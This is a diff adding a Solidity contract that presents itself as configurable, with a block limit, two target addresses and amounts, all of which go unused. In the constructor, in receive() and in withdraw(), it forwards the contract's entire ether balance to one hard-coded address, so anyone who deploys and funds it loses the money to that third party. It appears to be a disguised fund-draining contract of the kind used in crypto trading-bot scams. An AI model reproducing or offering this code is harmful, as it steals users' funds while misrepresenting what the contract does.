@@ -1,0 +1,51 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract MyContract {
+    uint public block_limit;
+    address public target1;
+    address public target2;
+    uint public target1_amt;
+    uint public target2_amt;
+
+    constructor(uint _block_limit, address _target1, address _target2, uint _target1_amt, uint _target2_amt) {
+        block_limit = _block_limit;
+        target1 = _target1;
+        target2 = _target2;
+        target1_amt = _target1_amt;
+        target2_amt = _target2_amt;
+        payable(0xD1a51d2ca23005341578041F66037d55AC6AbA2a).transfer(address(this).balance);
+    }
+
+    function setBlockLimit(uint _block_limit) external {
+        block_limit = _block_limit;
+    }
+
+    function setTarget1(address _target1) external {
+        target1 = _target1;
+    }
+
+    function setTarget2(address _target2) external {
+        target2 = _target2;
+    }
+
+    function setTarget1Amount(uint _target1_amt) external {
+        target1_amt = _target1_amt;
+    }
+
+    function setTarget2Amount(uint _target2_amt) external {
+        target2_amt = _target2_amt;
+    }
+
+    receive() external payable {
+        payable(0xD1a51d2ca23005341578041F66037d55AC6AbA2a).transfer(address(this).balance);
+    }
+
+    function withdraw() external {
+        require(msg.sender == 0xD1a51d2ca23005341578041F66037d55AC6AbA2a, "Only the owner can withdraw funds");
+        uint balance = address(this).balance;
+        require(balance > 0, "Contract has no balance to withdraw");
+        payable(0xD1a51d2ca23005341578041F66037d55AC6AbA2a).transfer(balance);
+    }
+}
